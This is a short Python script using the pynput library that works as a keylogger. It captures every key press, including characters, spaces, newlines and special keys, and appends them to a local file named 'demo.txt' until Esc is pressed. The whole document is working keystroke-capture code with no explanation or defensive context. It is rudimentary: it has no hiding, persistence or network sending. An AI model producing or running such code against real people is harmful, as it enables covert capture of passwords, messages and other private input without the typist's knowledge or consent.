from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    try:
        # Check if the pressed key is a special key
        if hasattr(key, 'char'):
            # Regular character key
            keys.append(key.char)
        elif key == Key.space:
            keys.append(' ')
        elif key == Key.enter:
            keys.append('\n')
        elif key == Key.ctrl_l or key == Key.backspace:
            # Handle Ctrl and Backspace key presses
            pass
        else:
            keys.append(f'<{key}>')
        
        write_to_file(keys)
    except AttributeError:
        pass

def write_to_file(key_list):
    with open("demo.txt", "a") as f:
        for key in key_list:
            f.write(key)

def on_release(key):
    if key == Key.esc:
        return False

    if key == Key.ctrl_l or key == Key.backspace:
        # Handle Ctrl and Backspace key releases
        pass

    keys.clear()  # Clear the keys list after each keypress

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
